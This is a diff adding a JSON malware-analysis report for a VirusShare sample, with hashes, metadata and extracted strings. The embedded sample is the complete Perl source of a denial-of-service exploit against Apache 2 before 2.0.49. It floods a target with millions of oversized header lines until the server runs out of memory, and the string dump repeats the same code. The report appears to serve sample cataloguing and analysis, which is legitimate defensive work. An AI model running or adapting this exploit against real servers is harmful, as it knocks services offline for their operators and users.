@@ -1,0 +1,65 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#/usr/bin/perl\n#\n#exploit for apache ap_get_mime_headers_core() vuln\n#\n#adv is here: http://www.guninski.com/httpd1.html\n#\n#version: apache 2 <2.0.49 apache 1 not tested.\n#\n#by bkbll bkbll#cnhonker.net http://www.cnhonker.com\n#\n#tail -f /var/log/messages\n#Jul 1 17:43:16 www kernel: Out of Memory: Killed process 658 (httpd)\n#\n\nuse IO::Socket::INET;\n\n$host=\"10.10.10.114\";\n$port=80;\n$sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port, Proto => 'tcp') || die \"new \nerror$@\\n\";\nbinmode($sock);\n$hostname=\"Host: $host\";\n$buf2='A'x50;\n$buf4='A'x8183;\n$len=length($buf2);\n$buf=\"GET / HTTP/1.1\\r\\n\";\nsend($sock,$buf,0) || die \"send error:$@\\n\";\nfor($i= 0; $i < 2000000; $i++)\n{\n    $buf=\" $buf4\\r\\n\";\n    send($sock,$buf,0) || die \"send error:$@, target maybe have been D.o.S?\\n\";\n}\n$buf=\"$hostname\\r\\n\";\n$buf.=\"Content-Length: $len\\r\\n\";\n\n$buf.=\"\\r\\n\";\n$buf.=$buf2.\"\\r\\n\\r\\n\";\n\nsend($sock,$buf,0) || die \"send error:$@\\n\";\nprint \"Ok, our buffer have send to target \\n\";\nclose($sock);\n"
+    },
+    "filename": "VirusShare_24f98f7bdec477474ff94b3216a4b605",
+    "filesize": 995,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "24f98f7bdec477474ff94b3216a4b605",
+        "sha1": "a59025fac5766e0aae365e6fb9de06ac40bcd008",
+        "sha256": "235a91ac603a774236b4e2c7579f55b102fd596181930d8bcb3892fb55030e6a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#/usr/bin/perl",
+            "#exploit for apache ap_get_mime_headers_core() vuln",
+            "#adv is here: http://www.guninski.com/httpd1.html",
+            "#version: apache 2 <2.0.49 apache 1 not tested.",
+            "#by bkbll bkbll#cnhonker.net http://www.cnhonker.com",
+            "#tail -f /var/log/messages",
+            "#Jul 1 17:43:16 www kernel: Out of Memory: Killed process 658 (httpd)",
+            "use IO::Socket::INET;",
+            "$host=\"10.10.10.114\";",
+            "$port=80;",
+            "$sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port, Proto => 'tcp') || die \"new ",
+            "error$@\\n\";",
+            "binmode($sock);",
+            "$hostname=\"Host: $host\";",
+            "$buf2='A'x50;",
+            "$buf4='A'x8183;",
+            "$len=length($buf2);",
+            "$buf=\"GET / HTTP/1.1\\r\\n\";",
+            "send($sock,$buf,0) || die \"send error:$@\\n\";",
+            "for($i= 0; $i < 2000000; $i++)",
+            "    $buf=\" $buf4\\r\\n\";",
+            "    send($sock,$buf,0) || die \"send error:$@, target maybe have been D.o.S?\\n\";",
+            "$buf=\"$hostname\\r\\n\";",
+            "$buf.=\"Content-Length: $len\\r\\n\";",
+            "$buf.=\"\\r\\n\";",
+            "$buf.=$buf2.\"\\r\\n\\r\\n\";",
+            "send($sock,$buf,0) || die \"send error:$@\\n\";",
+            "print \"Ok, our buffer have send to target \\n\";",
+            "close($sock);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "10.10.10.114"
+        ],
+        "url": [
+            "http://www.guninski.com/httpd1.html",
+            "http://www.cnhonker.com"
+        ]
+    },
+    "time": "0:00:00.286688",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
